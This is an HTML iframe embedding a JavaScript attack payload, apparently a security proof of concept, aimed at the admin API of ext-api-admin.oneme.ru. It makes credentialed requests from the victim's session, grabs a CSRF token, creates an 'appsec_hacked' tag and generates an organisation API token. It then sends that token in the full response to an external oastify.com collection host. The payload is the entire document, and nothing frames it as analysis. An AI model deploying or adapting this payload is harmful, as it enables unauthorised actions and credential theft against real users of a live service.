<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
(function () {
    var baseUrl = 'https://ext-api-admin.oneme.ru';

    function request(method, path, body, csrfToken) {
        return new Promise(function (resolve, reject) {
            var req = new XMLHttpRequest();
            req.open(method, new URL(path, baseUrl).href, true);
            req.withCredentials = true;

            if (body !== undefined) {
                req.setRequestHeader('Content-Type', 'application/json');
            }

            if (csrfToken) {
                req.setRequestHeader('X-Csrf-Token', csrfToken);
            }

            req.onload = function () {
                if (req.status >= 200 && req.status < 300) {
                    resolve(req.responseText);
                } else {
                    reject(new Error(path + ': HTTP ' + req.status));
                }
            };

            req.onerror = function () {
                reject(new Error('Сетевая ошибка: ' + path));
            };

            req.send(body === undefined ? null : JSON.stringify(body));
        });
    }

    (async function () {
        // 1. Получаем CSRF-токен.
        var csrfText = await request('POST', '/v1/csrf/refresh');
        var csrfToken = JSON.parse(csrfText).csrf_token;

        if (typeof csrfToken !== 'string' || !csrfToken) {
            throw new Error('В ответе отсутствует csrf_token');
        }

        // 2. Создаём тег.
        await request('POST', '/v1/tag/create', {
            text: 'appsec_hacked',
            color: 'orange'
        }, csrfToken);

        // 3. Выполняем POST с тем же CSRF-токеном.
        var tokenText = await request('POST', '/v1/organizations/create-token', {
            inn: '035878507724',
            admin: {
                phone: '+79999999999'
            }
        }, csrfToken);

        // 4. Кодируем полный JSON-ответ.
        var responseBody = JSON.parse(tokenText);
        var data = encodeURIComponent(JSON.stringify(responseBody));

        // 5. Отправляем финальный GET.
        await request('GET', 'https://oa2xe74a9lx2de47sw3nczef56bxztni.oastify.com/log?data=' + data);

        console.log('Все запросы выполнены успешно');
    })().catch(function (error) {
        console.error('Ошибка выполнения запросов:', error);
    });
})();
</script>"></iframe>
